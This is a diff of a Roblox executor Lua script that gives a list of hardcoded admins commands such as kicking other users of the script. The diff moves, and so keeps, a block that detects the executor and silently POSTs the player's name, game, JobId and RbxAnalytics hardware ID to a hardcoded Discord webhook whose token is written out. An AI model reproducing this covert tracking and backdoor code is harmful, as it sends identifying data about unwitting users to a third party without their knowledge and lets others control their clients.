@@ -8,65 +8,6 @@ local Admins = {
     [233377111] = true,
 }
 
-local Executor = identifyexecutor()
-local ExecutorText = ""
-
-if Executor == "Wave" then
-	ExecutorText = "Wave"
-elseif Executor == "Solara" then
-	ExecutorText = "Solara"
-elseif Executor == "Synapse Z" then
-	ExecutorText = "Synapse Z"
-elseif Executor == "AWP" then
-	ExecutorText = "AWP"
-elseif Executor == "Seliware" then
-	ExecutorText = "Seliware"
-else
-	ExecutorText = "Unknown"
-end
-
-local embed = {
-	["title"] = LocalPlayer.Name,
-	["color"] = 0x2f5bc7,
-	["fields"] = {
-		{
-			["name"] = "Executor",
-			["value"] = ExecutorText,
-			["inline"] = true
-		},
-		{
-			["name"] = "Game",
-			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-			["inline"] = true
-		},
-		{
-			["name"] = "JobId",
-			["value"] = game.JobId,
-			["inline"] = true
-		},
-		{
-			["name"] = "RbxAnalytics HWID",
-			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-			["inline"] = true
-		}
-	}
-}
-
-local payload = {
-	["embeds"] = {embed},
-}
-
-local httpRequest = {
-	Url = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2",
-	Method = "POST",
-	Headers = {
-		["Content-Type"] = "application/json"
-	},
-	Body = game:GetService("HttpService"):JSONEncode(payload)
-}
-
-request(httpRequest)
-
 local Commands = {
     ["kick"] = function()
         LocalPlayer:Kick("You have been kicked by an admin.")
@@ -141,3 +82,62 @@ Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+local Executor = identifyexecutor()
+local ExecutorText = ""
+
+if Executor == "Wave" then
+	ExecutorText = "Wave"
+elseif Executor == "Solara" then
+	ExecutorText = "Solara"
+elseif Executor == "Synapse Z" then
+	ExecutorText = "Synapse Z"
+elseif Executor == "AWP" then
+	ExecutorText = "AWP"
+elseif Executor == "Seliware" then
+	ExecutorText = "Seliware"
+else
+	ExecutorText = "Unknown"
+end
+
+local embed = {
+	["title"] = LocalPlayer.Name,
+	["color"] = 0x2f5bc7,
+	["fields"] = {
+		{
+			["name"] = "Executor",
+			["value"] = ExecutorText,
+			["inline"] = true
+		},
+		{
+			["name"] = "Game",
+			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+			["inline"] = true
+		},
+		{
+			["name"] = "JobId",
+			["value"] = game.JobId,
+			["inline"] = true
+		},
+		{
+			["name"] = "RbxAnalytics HWID",
+			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+			["inline"] = true
+		}
+	}
+}
+
+local payload = {
+	["embeds"] = {embed},
+}
+
+local httpRequest = {
+	Url = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2",
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body = game:GetService("HttpService"):JSONEncode(payload)
+}
+
+request(httpRequest)
